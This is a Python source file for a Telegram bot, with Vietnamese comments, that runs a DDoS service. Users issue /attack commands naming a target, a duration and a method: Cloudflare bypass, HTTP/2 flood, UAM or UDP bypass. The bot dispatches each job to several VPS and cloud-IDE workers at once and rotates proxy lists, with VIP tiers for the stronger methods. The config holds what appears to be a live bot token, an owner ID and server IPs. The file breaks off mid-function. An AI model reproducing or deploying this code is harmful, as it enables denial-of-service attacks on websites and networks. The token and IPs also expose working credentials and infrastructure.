#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
H2 Free Bot ‚Äî Ch·ªß s·ªü h·ªØu H2 
---------------------------------------
- Bot API ch√≠nh ƒë·ªÉ ph√¢n ph·ªëi c√¥ng vi·ªác cho c√°c VPS
- L·ªánh: /start /help /attack /methods /status /on /off /broadcast /addvip /removevip /addproxy /scanproxy
- Qu·∫£n l√Ω nhi·ªÅu VPS v·ªõi t√≠nh nƒÉng t·ª± ƒë·ªông chuy·ªÉn ƒë·ªïi khi b·∫≠n
- Ghi log, th·ªùi gian ho·∫°t ƒë·ªông v√† s·ªë li·ªáu server c∆° b·∫£n qua psutil
- Qu·∫£n l√Ω ng∆∞·ªùi d√πng VIP cho ph∆∞∆°ng th·ª©c BypassCF, UAM, UDPBypass trong l·ªánh /attack
- S·ª≠ d·ª•ng file proxy.txt tr·ª±c ti·∫øp tr√™n t·∫•t c·∫£ VPS

C√ÄI ƒê·∫∂T
-----
1) C√†i ƒë·∫∑t: pip install pyTelegramBotAPI psutil requests
2) Thi·∫øt l·∫≠p TOKEN, OWNER_ID v√† VPS_SERVERS trong m√£ ngu·ªìn
3) ƒê·∫£m b·∫£o m·ªói VPS c√≥ script worker (vps_worker.py), cfhieu.js, FloodH2.js, UAM.js v√† udpbypass (bi√™n d·ªãch t·ª´ udpbypass.c)
4) ƒê·∫£m b·∫£o file proxy.txt c√≥ s·∫µn tr√™n m·ªói VPS
5) Ch·∫°y: python3 h2_free_bot.py

PH√ÅP L√ù
-----
M·∫´u n√†y ch·ªâ d√πng cho t·ª± ƒë·ªông h√≥a h·ª£p ph√°p. M·ªçi h√¨nh th·ª©c ki·ªÉm tra t·∫£i ho·∫∑c t·∫•n c√¥ng DDoS tr√°i ph√©p ƒë·ªÅu b·ªã c·∫•m. Ch·ªâ th·ª±c hi·ªán ki·ªÉm tra t·∫£i v·ªõi s·ª± cho ph√©p b·∫±ng vƒÉn b·∫£n r√µ r√†ng t·ª´ ch·ªß s·ªü h·ªØu h·ªá th·ªëng trong m√¥i tr∆∞·ªùng ƒë∆∞·ª£c ki·ªÉm so√°t.
"""

import os
import time
import logging
import psutil
import telebot
import requests
import json
from threading import Thread
import concurrent.futures
import socket

# ===================== C·∫•u h√¨nh =====================
TOKEN = os.getenv("BOT_TOKEN", "8478870651:AAF07df3jjh6n3xevJHCmqOp5yWG_WB9wmA")  # Token bot Telegram
OWNER_ID = int(os.getenv("BOT_OWNER_ID", "8118372021"))  # ID ng∆∞·ªùi d√πng Telegram c·ªßa ch·ªß s·ªü h·ªØu
DEFAULT_PROXY_FILE = "proxy.txt"  # File proxy tr√™n VPS
DEFAULT_RATE = "64"  # T·ª∑ l·ªá y√™u c·∫ßu m·∫∑c ƒë·ªãnh cho Flood
DEFAULT_THREAD = "5"  # S·ªë lu·ªìng m·∫∑c ƒë·ªãnh cho Flood
VIP_FILE = "vip_users.json"  # File l∆∞u danh s√°ch ID ng∆∞·ªùi d√πng VIP
PROXY_SOURCES_FILE = "api.txt"  # File ch·ª©a ngu·ªìn proxy

# Danh s√°ch endpoint c·ªßa c√°c VPS v·ªõi ID thay th·∫ø IP
# B·∫°n c√≥ th·ªÉ th√™m c√°c m√¥i tr∆∞·ªùng nh∆∞ Codespace ho·∫∑c IDX (Project IDX) b·∫±ng c√°ch th√™m endpoint URL t∆∞∆°ng ·ª©ng
# V√≠ d·ª•: N·∫øu Codespace ho·∫∑c IDX c√≥ server worker ch·∫°y tr√™n port 5000 v√† c√≥ ƒë·ªãa ch·ªâ c√¥ng khai (v√≠ d·ª• qua ngrok ho·∫∑c public URL),
# th√™m nh∆∞ sau: {"id": "Codespace-001", "url": "http://your-codespace-public-url:5000/execute"}
# ƒê·∫£m b·∫£o worker (vps_worker.py) ch·∫°y tr√™n c√°c m√¥i tr∆∞·ªùng ƒë√≥ v√† c√≥ th·ªÉ nh·∫≠n request t·ª´ b√™n ngo√†i.
VPS_SERVERS = [
    {"id": "VPS-001", "url": "http://160.191.243.252:5000/execute"},
    {"id": "VPS-002", "url": "http://103.238.235.193:5000/execute"},
    {"id": "Codespace-001", "url": "https://probable-broccoli-rqvjpqrjxv92xvpr-5000.app.github.dev/execute"},
    {"id": "IDX-001", "url": "https://h2-16504995-5000.web.app/execute"}  # C·∫≠p nh·∫≠t IP th·ª±c t·∫ø c·ªßa VPS-002
    # Th√™m v√≠ d·ª• cho Codespace ho·∫∑c IDX (thay b·∫±ng URL th·ª±c t·∫ø c·ªßa b·∫°n):
    # {"id": "Codespace-001", "url": "http://your-codespace-url:5000/execute"},
    # {"id": "IDX-001", "url": "http://your-idx-url:5000/execute"},
]

# Danh s√°ch ph∆∞∆°ng th·ª©c hi·ªán c√≥
METHODS = [
    {"name": "BypassCF", "script": "cfhieu.js", "description": "Ph∆∞∆°ng th·ª©c bypass Cloudflare (ch·ªâ d√†nh cho VIP)", "max_time": 120, "vip_only": True},
    {"name": "Flood", "script": "FloodH2.js", "description": "Ph∆∞∆°ng th·ª©c flood HTTP v·ªõi HTTP/2", "max_time": 60, "vip_max_time": 120},
    {"name": "UAM", "script": "UAM.js", "description": "Ph∆∞∆°ng th·ª©c UAM (ch·ªâ d√†nh cho VIP)", "max_time": 120, "vip_only": True},
    {"name": "UDPBypass", "script": "udpbypass", "description": "Ph∆∞∆°ng th·ª©c UDP Bypass (ch·ªâ d√†nh cho VIP)", "max_time": 120, "vip_only": True}
]

BOT_NAME = "H2 Free Bot"
PARSE_MODE = "HTML"

# ===================== Ghi log =====================
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[
        logging.FileHandler("logs/h2_free_bot.log", encoding="utf-8"),
        logging.StreamHandler()
    ]
)

# ===================== Qu·∫£n l√Ω VIP =====================
def load_vip_users():
    """T·∫£i danh s√°ch ID ng∆∞·ªùi d√πng VIP t·ª´ file."""
    try:
        if os.path.exists(VIP_FILE):
            with open(VIP_FILE, 'r') as f:
                return set(json.load(f))
        return set()
    except Exception as e:
        logging.error("L·ªói khi t·∫£i danh s√°ch VIP: %s", e)
        return set()

def save_vip_users(vip_users):
    """L∆∞u danh s√°ch ID ng∆∞·ªùi d√πng VIP v√†o file."""
    try:
        with open(VIP_FILE, 'w') as f:
            json.dump(list(vip_users), f)
    except Exception as e:
        logging.error("L·ªói khi l∆∞u danh s√°ch VIP: %s", e)

# Kh·ªüi t·∫°o danh s√°ch VIP
vip_users = load_vip_users()

# ===================== Qu·∫£n l√Ω Proxy =====================
def load_proxy_sources():
    """T·∫£i danh s√°ch ngu·ªìn proxy t·ª´ file api.txt."""
    try:
        if os.path.exists(PROXY_SOURCES_FILE):
            with open(PROXY_SOURCES_FILE, 'r') as f:
                return [line.strip() for line in f.readlines() if line.strip()]
        return []
    except Exception as e:
        logging.error("L·ªói khi t·∫£i ngu·ªìn proxy: %s", e)
        return []

def ensure_proxy_file_exists():
    """ƒê·∫£m b·∫£o file proxy.txt t·ªìn t·∫°i tr√™n VPS."""
    for vps in VPS_SERVERS:
        try:
            update_url = vps["url"].replace("/execute", "/check_proxies")
            response = requests.get(update_url, timeout=10)
            if response.status_code == 200:
                logging.info(f"File proxy.txt ƒë∆∞·ª£c x√°c nh·∫≠n tr√™n VPS {vps['id']}.")
            else:
                logging.error(f"Ki·ªÉm tra file proxy.txt th·∫•t b·∫°i tr√™n VPS {vps['id']}: {response.text}")
        except Exception as e:
            logging.error(f"L·ªói khi ki·ªÉm tra proxy.txt tr√™n VPS {vps['id']}: {str(e)}")

def fetch_proxies_from_sources(sources):
    """L·∫•y proxy t·ª´ c√°c ngu·ªìn."""
    proxies = set()
    for source in sources:
        try:
            resp = requests.get(source, timeout=10)
            if resp.status_code == 200:
                new_proxies = [p.strip() for p in resp.text.splitlines() if p.strip()]
                proxies.update(new_proxies)
        except Exception as e:
            logging.error(f"L·ªói khi l·∫•y proxy t·ª´ {source}: {str(e)}")
    return list(proxies)

def check_proxy(proxy):
    """Ki·ªÉm tra proxy s·ªëng b·∫±ng c√°ch k·∫øt n·ªëi ƒë·∫øn google.com."""
    try:
        host, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, int(port)))
        sock.close()
        return True
    except:
        return False

# ===================== Bi·∫øn to√†n c·ª•c =====================
bot = telebot.TeleBot(TOKEN, parse_mode=PARSE_MODE)
start_time = time.time()
bot_active = True  # C√≥ th·ªÉ b·∫≠t/t·∫Øt b·ªüi ch·ªß s·ªü h·ªØu qua /on /off
running_tasks = {}  # Theo d√µi c√°c t√°c v·ª• ƒëang ch·∫°y theo chat ID (b√¢y gi·ªù l√† dict chat_id -> list of tasks)
scanning_proxies = False  # Tr·∫°ng th√°i scan proxy

# ===================== Qu·∫£n l√Ω VPS =====================
def check_vps_status(vps_entry):
    """Ki·ªÉm tra tr·∫°ng th√°i VPS (r·∫£nh hay b·∫≠n) d·ª±a tr√™n URL."""
    try:
        status_url = vps_entry["url"].replace("/execute", "/status")
        logging.info(f"ƒêang ki·ªÉm tra tr·∫°ng th√°i VPS {vps_entry['id']} t·∫°i {status_url}...")
        response = requests.get(status_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            is_available = data.get("status") != "running"
            logging.info(f"Tr·∫°ng th√°i VPS {vps_entry['id']}: {'R·∫£nh' if is_available else 'B·∫≠n'}")
            return is_available
        else:
            logging.error(f"Ki·ªÉm tra tr·∫°ng th√°i VPS {vps_entry['id']} th·∫•t b·∫°i v·ªõi m√£ {response.status_code}: {response.text}")
            return False
    except requests.exceptions.Timeout:
        logging.error(f"Timeout khi ki·ªÉm tra tr·∫°ng th√°i VPS {vps_entry['id']}: C√≥ th·ªÉ VPS kh√¥ng ph·∫£n h·ªìi.")
        return False
    except requests.exceptions.ConnectionError:
        logging.error(f"L·ªói k·∫øt n·ªëi v·ªõi VPS {vps_entry['id']}: Ki·ªÉm tra m·∫°ng ho·∫∑c port 5000.")
        return False
    except Exception as e:
        logging.error(f"Ki·ªÉm tra tr·∫°ng th√°i VPS {vps_entry['id']} th·∫•t b·∫°i: {str(e)}")
        return False

def get_all_available_vps():
    """T√¨m t·∫•t c·∫£ c√°c VPS r·∫£nh, ∆∞u ti√™n theo th·ª© t·ª± danh s√°ch."""
    available = []
    for vps_entry in VPS_SERVERS:
        if check_vps_status(vps_entry):
            logging.info(f"VPS r·∫£nh: {vps_entry['id']}")
            available.append(vps_entry)
    if not available:
        logging.warning("Kh√¥ng c√≥ VPS n√†o r·∫£nh.")
    return available

def execute_on_vps(vps_entry, payload, chat_id):
    """G·ª≠i l·ªánh ƒë·∫øn VPS v√† theo d√µi qu√° tr√¨nh th·ª±c thi."""
    try:
        response = requests.post(vps_entry["url"], json=payload, timeout=10)
        if response.status_code == 200:
            data = response.json()
            task_id = data.get("task_id")
            bot.send_message(chat_id, f"<b>ƒê√£ kh·ªüi ƒë·ªông t·∫•n c√¥ng tr√™n VPS</b> üî•üöÄ\nID t√°c v·ª•: {task_id}\nVPS: {vps_entry['id']}\n‚Ä¢ M·ª•c ti√™u: {payload['target']}\n‚Ä¢ Th·ªùi gian: {payload['time']} gi√¢y\nTr·∫°ng th√°i: <code>ƒêang th·ª±c thi... üí•</code>\nC∆°n l≈© ƒëang cu·ªôn tr√†o! üåä‚ö° Theo d√µi b·∫±ng /status.")
            
            # Theo d√µi tr·∫°ng th√°i t√°c v·ª•
            def monitor_task():
                error_count = 0
                while True:
                    try:
                        status_response = requests.get(f"{vps_entry['url'].replace('/execute', '/status')}?task_id={task_id}", timeout=15)
                        if status_response.status_code == 200:
                            status_data = status_response.json()
                            if status_data.get("status") == "completed":
                                bot.send_message(chat_id, f"<b>Ho√†n t·∫•t th·ª±c thi t·∫•n c√¥ng</b> ‚úÖ\nID t√°c v·ª•: {task_id}\nT·∫•n c√¥ng ƒë√£ k·∫øt th√∫c.")
                                # X√≥a task kh·ªèi list running_tasks
                                if chat_id in running_tasks:
                                    running_tasks[chat_id] = [t for t in running_tasks[chat_id] if t['task_id'] != task_id]
                                    if not running_tasks[chat_id]:
                                        del running_tasks[chat_id]
                                break
                            elif status_data.get("status") == "not_found":
                                bot.send_message(chat_id, f"<b>L·ªói</b> ‚ùå\nTask {task_id} kh√¥ng t·ªìn t·∫°i tr√™n VPS.")
                                break
                            elif status_data.get("output"):
                                bot.send_message(chat_id, f"<code>{status_data['output']}</code>")
                            error_count = 0
                        else:
                            logging.error(f"Truy v·∫•n tr·∫°ng th√°i th·∫•t b·∫°i, m√£ tr·∫°ng th√°i: {status_response.status_code}")
                            error_count += 1
                            if error_count > 5:
                                bot.send_message(chat_id, f"<b>L·ªói theo d√µi</b> ‚ö†Ô∏è\nKh√¥ng th·ªÉ l·∫•y tr·∫°ng th√°i task {task_id} sau nhi·ªÅu l·∫ßn th·ª≠. Ki·ªÉm tra VPS.")
                                break
                    except requests.exceptions.ReadTimeout:
                        bot.send_message(chat_id, f"<b>C·∫£nh b√°o</b> ‚ö†Ô∏è\nID t√°c v·ª•: {task_id}\nK·∫øt n·ªëi v·ªõi VPS {vps_entry['id']} b·ªã timeout. Vui l√≤ng ki·ªÉm tra m·∫°ng ho·∫∑c th·ª≠ l·∫°i sau.")
                        break
                    except Exception as e:
                        bot.send_message(chat_id, f"<b>L·ªói khi theo d√µi t√°c v·ª•</b> ‚ùå\nID t√°c v·ª•: {task_id}\nL·ªói: {str(e)}")
                        break
                    time.sleep(2)
            
            Thread(target=monitor_task).start()
        else:
            bot.send_message(chat_id, f"<b>Kh·ªüi ƒë·ªông th·∫•t b·∫°i</b> ‚ùå\nVPS {vps_entry['id']} tr·∫£ v·ªÅ l·ªói: {response.text}")
    except Exception as e:
        bot.send_message(chat_id, f"<b>Kh·ªüi ƒë·ªông th·∫•t b·∫°i</b> ‚ùå\nL·ªói khi li√™n h·ªá VPS {vps_entry['id']}: {str(e)}")

# ===================== H√†m h·ªó tr·ª£ =====================
def is_owner(uid: int) -> bool:
    """Ki·ªÉm tra xem ng∆∞·ªùi d√πng c√≥ ph·∫£i l√† ch·ªß s·ªü h·ªØu kh√¥ng."""
    return OWNER_ID != 0 and uid == OWNER_ID

def is_vip(uid: int) -> bool:
    """Ki·ªÉm tra xem ng∆∞·ªùi d√πng c√≥ ph·∫£i l√† VIP ho·∫∑c ch·ªß s·ªü h·ªØu kh√¥ng."""
    return uid in vip_users or is_owner(uid)

def uptime_str() -> str:
    """T√≠nh th·ªùi gian bot ho·∫°t ƒë·ªông."""
    s = int(time.time() - start_time)
    d, s = divmod(s, 86400)
    h, s = divmod(s, 3600)
    m, s = divmod(s, 60)
    return f"{d} ng√†y {h} gi·ªù {m} ph√∫t {s} gi√¢y"

def safe_reply(message, text: str):
    """G·ª≠i tin nh·∫Øn tr·∫£ l·ªùi m·ªôt c√°ch an to√†n."""
    try:
        bot.reply_to(message, text)
    except Exception as e:
        logging.error("L·ªói g·ª≠i tin nh·∫Øn: %s", e)

def require_active(func):
    """Decorator: b·ªè qua tin nh·∫Øn t·ª´ ng∆∞·ªùi kh√¥ng ph·∫£i ch·ªß s·ªü h·ªØu khi bot t·∫Øt."""
    def wrapper(message):
        global bot_active
        if not bot_active and not is_owner(message.from_user.id):
            return
        try:
            bot.send_chat_action(message.chat.id, "typing")
        except Exception:
            pass
        return func(message)
    return wrapper

# ===================== L·ªánh =====================
@bot.message_handler(commands=["start", "help"])
@require_active
def cmd_help(message):
    """Hi·ªÉn th·ªã th√¥ng tin tr·ª£ gi√∫p."""
    text = (
        f"<b>{BOT_NAME}</b>\n"
        "Bot Telegram - C√¥ng C·ª• Mi·ªÖn Ph√≠.\n\n"
        "<b>L·ªánh</b>\n"
        "‚Ä¢ /start, /help ‚Äî hi·ªÉn th·ªã tr·ª£ gi√∫p n√†y\n"
        "‚Ä¢ /attack [ph∆∞∆°ng_th·ª©c] &lt;m·ª•c_ti√™u&gt; &lt;th·ªùi_gian&gt; ‚Äî ch·∫°y ph∆∞∆°ng th·ª©c t·∫•n c√¥ng (BypassCF ch·ªâ d√†nh cho VIP)\n"
        "   - ƒê·ªëi v·ªõi UAM: /attack UAM target time [rate=100] [thread=8]\n"
        "   - ƒê·ªëi v·ªõi UDPBypass: /attack UDPBypass ip port time [burst=1024]\n"
        "‚Ä¢ /methods ‚Äî xem danh s√°ch c√°c ph∆∞∆°ng th·ª©c hi·ªán c√≥\n"
        "‚Ä¢ /status ‚Äî tr·∫°ng th√°i bot/server\n"
    )
    if is_owner(message.from_user.id):
        text += (
            "\n<b>Ch·ªâ d√†nh cho ch·ªß s·ªü h·ªØu</b>\n"
            "‚Ä¢ /on, /off ‚Äî b·∫≠t/t·∫Øt bot (ng∆∞·ªùi kh√¥ng ph·∫£i ch·ªß s·ªü h·ªØu s·∫Ω b·ªã t·∫Øt ti·∫øng)\n"
            "‚Ä¢ /broadcast &lt;tin_nh·∫Øn&gt; ‚Äî g·ª≠i tin nh·∫Øn ƒë·∫øn chat hi·ªán t·∫°i (demo)\n"
            "‚Ä¢ /addvip &lt;@t√™n_ng∆∞·ªùi_d√πng&gt; &lt;user_id&gt; ‚Äî th√™m ng∆∞·ªùi d√πng v√†o danh s√°ch VIP\n"
            "‚Ä¢ /removevip &lt;user_id&gt; ‚Äî x√≥a ng∆∞·ªùi d√πng kh·ªèi danh s√°ch VIP\n"
            "‚Ä¢ /addproxy ‚Äî c·∫≠p nh·∫≠t proxy m·ªõi t·ª´ ngu·ªìn (x√≥a c≈© v√† th√™m m·ªõi)\n"
            "‚Ä¢ /scanproxy ‚Äî scan proxy s·ªëng t·ª´ ngu·ªìn v√† c·∫≠p nh·∫≠t (t·∫°m d·ª´ng t·∫•n c√¥ng trong l√∫c scan)\n"
        )
    safe_reply(message, text)

@bot.message_handler(commands=["methods"])
@require_active
def cmd_methods(message):
    """Hi·ªÉn th·ªã danh s√°ch c√°c ph∆∞∆°ng th·ª©c hi·ªán c√≥."""
    methods_text = "<b>Danh s√°ch Ph∆∞∆°ng th·ª©c</b> üåü\n"
    for method in METHODS:
        vip_note = " (ch·ªâ VIP)" if method.get("vip_only", False) else ""
        max_time = method["max_time"]
        if "vip_max_time" in method and is_vip(message.from_user.id):
            max_time = method["vip_max_time"]
        methods_text += f"‚Ä¢ <b>{method['name']}</b>{vip_note}: {method['description']} (Th·ªùi gian t·ªëi ƒëa: {max_time} gi√¢y)\n"
    safe_reply(message, methods_text)

@bot.message_handler(commands=["attack"])
@require_active
def cmd_attack(message):
    """Th·ª±c thi l·ªánh t·∫•n c√¥ng."""
    global scanning_proxies
    if scanning_proxies:
        safe_reply(message, "<b>Th√¥ng b√°o</b> ‚ö†Ô∏è\nBot ƒëang scan proxy trong v√≤ng 10p. Vui l√≤ng ch·ªù!")
        return

    parts = message.text.split()
    if len(parts) < 3:
        safe_reply(message, "C√°ch d√πng: <code>/attack [ph∆∞∆°ng_th·ª©c] m·ª•c_ti√™u th·ªùi_gian ...</code>\nXem /help ƒë·ªÉ bi·∫øt chi ti·∫øt.")
        return
    
    method_name = parts[1].upper()
    selected_method = next((m for m in METHODS if m["name"].upper() == method_name), None)
    if not selected_method:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nPh∆∞∆°ng th·ª©c kh√¥ng t·ªìn t·∫°i. S·ª≠ d·ª•ng /methods ƒë·ªÉ xem danh s√°ch.")
        return

    # Ki·ªÉm tra quy·ªÅn VIP
    if selected_method.get("vip_only", False) and not is_vip(message.from_user.id):
        safe_reply(message, "<b>Truy c·∫≠p b·ªã t·ª´ ch·ªëi</b> üö´\nPh∆∞∆°ng th·ª©c n√†y ch·ªâ d√†nh cho ng∆∞·ªùi d√πng VIP. Li√™n h·ªá ch·ªß s·ªü h·ªØu ƒë·ªÉ tr·ªü th√†nh VIP.")
        return

    # Parse t√πy theo method
    if method_name in ["BYPASSCF", "FLOOD"]:
        if len(parts) < 4:
            safe_reply(message, f"C√°ch d√πng cho {method_name}: <code>/attack {method_name} target time</code>")
            return
        target = parts[2]
        time_ = parts[3]
        rate = DEFAULT_RATE
        thread = DEFAULT_THREAD
    elif method_name == "UAM":
        if len(parts) < 4:
            safe_reply(message, "C√°ch d√πng cho UAM: <code>/attack UAM target time [rate=100] [thread=8]</code>")
            return
        target = parts[2]
        time_ = parts[3]
        rate = parts[4] if len(parts) > 4 else "100"
        thread = parts[5] if len(parts) > 5 else "8"
    elif method_name == "UDPBYPASS":
        if len(parts) < 5:
            safe_reply(message, "C√°ch d√πng cho UDPBypass: <code>/attack UDPBypass ip port time [burst=1024]</code>")
            return
        ip = parts[2]
        port_ = parts[3]
        time_ = parts[4]
        burst = parts[5] if len(parts) > 5 else "1024"
        target = ip
    else:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nPh∆∞∆°ng th·ª©c kh√¥ng ƒë∆∞·ª£c h·ªó tr·ª£.")
        return

    # Ki·ªÉm tra v√† gi·ªõi h·∫°n th·ªùi gian t·∫•n c√¥ng
    try:
        time_int = int(time_)
        max_time = selected_method["max_time"]
        if "vip_max_time" in selected_method and is_vip(message.from_user.id):
            max_time = selected_method["vip_max_time"]
        if time_int <= 0 or time_int > max_time:
            safe_reply(message, f"<b>L·ªói</b> ‚ùå\nTh·ªùi gian ph·∫£i t·ª´ 1 ƒë·∫øn {max_time} gi√¢y cho ph∆∞∆°ng th·ª©c {selected_method['name']}.")
            return
    except ValueError:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nTh·ªùi gian ph·∫£i l√† m·ªôt s·ªë nguy√™n h·ª£p l·ªá.")
        return

    script = selected_method["script"]
    proxyfile = DEFAULT_PROXY_FILE

    # X√¢y d·ª±ng payload t√πy method
    payload = {
        "script": script,
        "target": target,
        "time": time_,
    }
    if method_name in ["FLOOD", "UAM"]:
        payload["rate"] = rate
        payload["thread"] = thread
        payload["proxyfile"] = proxyfile
    if method_name == "UAM":
        payload["cookiecount"] = "6"
    if method_name == "UDPBYPASS":
        payload["port"] = port_
        payload["packet_size"] = "1472"
        payload["burst"] = burst
    if method_name == "BYPASSCF":
        payload["rate"] = DEFAULT_RATE
        payload["thread"] = DEFAULT_THREAD
        payload["proxyfile"] = proxyfile
    
    # T√¨m t·∫•t c·∫£ VPS r·∫£nh
    available_vps = get_all_available_vps()
    if not available_vps:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nKh√¥ng c√≥ VPS n√†o r·∫£nh ƒë·ªÉ th·ª±c thi t√°c v·ª•. Vui l√≤ng ch·ªù khi VPS r·∫£nh v√† ki·ªÉm tra /status.")
        return
    
    # L∆∞u th√¥ng tin t√°c v·ª• (b√¢y gi·ªù l√† list)
    if message.chat.id not in running_tasks:
        running_tasks[message.chat.id] = []
    for vps_entry in available_vps:
        running_tasks[message.chat.id].append({"vps_id": vps_entry["id"], "target": target, "time": time_, "task_id": None})  # task_id s·∫Ω c·∫≠p nh·∫≠t sau
    
    # Th·ª±c thi tr√™n t·∫•t c·∫£ VPS r·∫£nh c√πng l√∫c
    for vps_entry in available_vps:
        Thread(target=execute_on_vps, args=(vps_entry, payload, message.chat.id)).start()

@bot.message_handler(commands=["addvip"])
def cmd_addvip(message):
    """Th√™m ng∆∞·ªùi d√πng v√†o danh s√°ch VIP."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy c·∫≠p b·ªã t·ª´ ch·ªëi</b> üö´\nL·ªánh n√†y ch·ªâ d√†nh cho ch·ªß s·ªü h·ªØu.")
        return
    parts = message.text.split()
    if len(parts) != 3:
        safe_reply(message, "C√°ch d√πng: <code>/addvip @t√™n_ng∆∞·ªùi_d√πng user_id</code>")
        return
    
    username, user_id = parts[1], parts[2]
    if not username.startswith('@'):
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nT√™n ng∆∞·ªùi d√πng ph·∫£i b·∫Øt ƒë·∫ßu b·∫±ng @.")
        return
    
    try:
        user_id = int(user_id)
        vip_users.add(user_id)
        save_vip_users(vip_users)
        safe_reply(message, f"<b>Th√†nh c√¥ng</b> ‚úÖ\nNg∆∞·ªùi d√πng {username} (ID: {user_id}) ƒë√£ ƒë∆∞·ª£c th√™m v√†o danh s√°ch VIP.")
    except ValueError:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nID ng∆∞·ªùi d√πng ph·∫£i l√† s·ªë.")
    except Exception as e:
        safe_reply(message, f"<b>L·ªói</b> ‚ùå\nTh√™m VIP th·∫•t b·∫°i: {str(e)}")

@bot.message_handler(commands=["removevip"])
def cmd_removevip(message):
    """X√≥a ng∆∞·ªùi d√πng kh·ªèi danh s√°ch VIP."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy c·∫≠p b·ªã t·ª´ ch·ªëi</b> üö´\nL·ªánh n√†y ch·ªâ d√†nh cho ch·ªß s·ªü h·ªØu.")
        return
    parts = message.text.split()
    if len(parts) != 2:
        safe_reply(message, "C√°ch d√πng: <code>/removevip user_id</code>")
        return
    
    try:
        user_id = int(parts[1])
        if user_id in vip_users:
            vip_users.remove(user_id)
            save_vip_users(vip_users)
            safe_reply(message, f"<b>Th√†nh c√¥ng</b> ‚úÖ\nNg∆∞·ªùi d√πng {user_id} ƒë√£ b·ªã x√≥a kh·ªèi danh s√°ch VIP.")
        else:
            safe_reply(message, f"<b>L·ªói</b> ‚ùå\nNg∆∞·ªùi d√πng {user_id} kh√¥ng c√≥ trong danh s√°ch VIP.")
    except ValueError:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nID ng∆∞·ªùi d√πng ph·∫£i l√† s·ªë.")
    except Exception as e:
        safe_reply(message, f"<b>L·ªói</b> ‚ùå\nX√≥a VIP th·∫•t b·∫°i: {str(e)}")

@bot.message_handler(commands=["status"])
@require_active
def cmd_status(message):
    """Hi·ªÉn th·ªã tr·∫°ng th√°i bot v√† VPS."""
    try:
        cpu = psutil.cpu_percent(interval=0.6)
        mem = psutil.virtual_memory().percent
        disk = psutil.disk_usage("/").percent
    except Exception:
        cpu = mem = disk = -1
    
    process_status = "Kh√¥ng c√≥ t√°c v·ª• t·∫•n c√¥ng n√†o ƒëang ch·∫°y."
    if message.chat.id in running_tasks and running_tasks[message.chat.id]:
        tasks = running_tasks[message.chat.id]
        process_status = "\n".join([f"T·∫•n c√¥ng ƒëang ch·∫°y tr√™n VPS {t['vps_id']}... üí•\nM·ª•c ti√™u: {t['target']}\nTh·ªùi gian: {t['time']} gi√¢y" for t in tasks])
    
    vps_status = "\n".join([f"‚Ä¢ VPS {vps['id']}: {'R·∫£nh ‚úÖ' if check_vps_status(vps) else 'B·∫¨N üõë'}" for vps in VPS_SERVERS])
    
    text = (
        "<b>Tr·∫°ng th√°i Bot</b> üåü\n"
        f"‚Ä¢ Th·ªùi gian ho·∫°t ƒë·ªông: {uptime_str()}\n"
        f"‚Ä¢ CPU: {cpu}% üî•\n"
        f"‚Ä¢ RAM: {mem}% ‚ö°\n"
        f"‚Ä¢ ·ªî c·ª©ng: {disk}% üíæ\n"
        f"‚Ä¢ Tr·∫°ng th√°i: {'B·∫¨T ‚úÖ' if bot_active else 'T·∫ÆT üõë'}\n"
        f"‚Ä¢ T·∫•n c√¥ng: {process_status}\n"
        f"‚Ä¢ Tr·∫°ng th√°i VIP: {'VIP ‚úÖ' if is_vip(message.from_user.id) else 'Kh√¥ng ph·∫£i VIP üö´'}\n"
        f"‚Ä¢ Scan Proxy: {'ƒêang scan ‚öôÔ∏è' if scanning_proxies else 'Kh√¥ng scan'}\n"
        f"<b>Tr·∫°ng th√°i VPS</b>\n{vps_status}"
    )
    safe_reply(message, text)

@bot.message_handler(commands=["on"])
def cmd_on(message):
    """B·∫≠t bot."""
    global bot_active
    if not is_owner(message.from_user.id):
        return
    bot_active = True
    safe_reply(message, "<b>Bot B·∫¨T</b> ‚úÖ")

@bot.message_handler(commands=["off"])
def cmd_off(message):
    """T·∫Øt bot."""
    global bot_active
    if not is_owner(message.from_user.id):
        return
    bot_active = False
    safe_reply(message, "<b>Bot T·∫ÆT</b> üõë")

@bot.message_handler(commands=["broadcast"])
def cmd_broadcast(message):
    """G·ª≠i tin nh·∫Øn ph√°t s√≥ng."""
    if not is_owner(message.from_user.id):
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        safe_reply(message, "C√°ch d√πng: <code>/broadcast tin_nh·∫Øn</code>")
        return
    bot.send_message(message.chat.id, f"<b>[Ph√°t tin]</b> {parts[1]}", parse_mode=PARSE_MODE)

@bot.message_handler(commands=["addproxy"])
def cmd_addproxy(message):
    """C·∫≠p nh·∫≠t proxy m·ªõi t·ª´ ngu·ªìn, x√≥a c≈© v√† th√™m m·ªõi."""
    if not is_owner(message.from_user.id):
        safe_reply(message, "<b>Truy c·∫≠p b·ªã t·ª´ ch·ªëi</b> üö´\nL·ªánh n√†y ch·ªâ d√†nh cho ch·ªß s·ªü h·ªØu.")
        return
    
    sources = load_proxy_sources()
    if not sources:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nKh√¥ng t√¨m th·∫•y ngu·ªìn proxy trong api.txt.")
        return
    
    proxies = fetch_proxies_from_sources(sources)
    
    if not proxies:
        safe_reply(message, "<b>L·ªói</b> ‚ùå\nKh√¥ng th·ªÉ l·∫•y proxy t·ª´ b·∫•t k·ª≥ ngu·ªìn n√†o.")
        return
    
    success_count = 0
    for vps in VPS_SERVERS:
        update_url = vps["url"].replace("/execute", "/update_proxies")
        try:
            response = requests.post(update_url, json={"proxies": proxies}, timeout=10)
            if response.status_code == 200:
                success_count += 1
                logging.info(f"ƒê√£ c·∫≠p nh·∫≠t {len(proxies)} proxy tr√™n VPS {vps['id']}.")
            else:
                logging.error(f"L·ªói c·∫≠p nh·∫≠t proxy tr√™n VPS {vps['id']}: {response.text}")
